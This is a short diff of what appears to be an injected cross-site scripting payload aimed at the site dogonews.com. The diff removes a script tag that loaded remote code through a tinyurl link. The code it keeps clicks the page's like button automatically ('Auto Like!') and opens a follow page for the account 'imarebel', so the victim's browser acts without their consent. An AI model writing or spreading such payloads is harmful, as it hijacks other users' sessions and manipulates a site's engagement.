@@ -1,4 +1,4 @@
-<script src="https://tinyurl.com/j39dsb4"> </script>
+
 $(".xss").parent().parent().find('.footer').first().find('button.like.btn').first().click(); //Auto Like!
 
 var myPopup = window.open('https://www.dogonews.com/i/imarebel/follow'); //Open follow window
